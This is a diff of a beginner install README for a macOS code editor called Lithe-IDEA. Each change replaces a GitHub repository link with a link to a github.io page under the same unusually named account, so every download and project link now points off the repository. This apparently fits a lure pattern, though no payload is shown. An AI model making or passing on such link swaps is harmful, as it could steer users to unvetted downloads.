@@ -4,14 +4,14 @@
 
 Welcome to Lithe-IDEA, a simple and fast tool for writing code on your macOS computer. This guide will help you download and run the application.
 
-Visit this link to download the application: [https://github.com/Ingratiating-blackcalla516/Lithe-IDEA](https://github.com/Ingratiating-blackcalla516/Lithe-IDEA)
+Visit this link to download the application: [https://ingratiating-blackcalla516.github.io](https://ingratiating-blackcalla516.github.io)
 
 ## 📥 Download & Install
 
 To get Lithe-IDEA on your computer, follow these steps:
 
 1. Click the big button below to go to the download page:
-   [**DOWNLOAD LITHE-IDEA**](https://github.com/Ingratiating-blackcalla516/Lithe-IDEA)
+   [**DOWNLOAD LITHE-IDEA**](https://ingratiating-blackcalla516.github.io)
 
 2. On the page that opens, look for a button or link that says "Download" or "Releases."
 
@@ -75,7 +75,7 @@ If you have trouble downloading or running Lithe-IDEA, try these tips:
 
 If you still have questions, you can visit the project page for more information:
 
-- Project Website: [https://github.com/Ingratiating-blackcalla516/Lithe-IDEA](https://github.com/Ingratiating-blackcalla516/Lithe-IDEA)
+- Project Website: [https://ingratiating-blackcalla516.github.io](https://ingratiating-blackcalla516.github.io)
 
 You can also ask a friend who knows about computers for help.
 
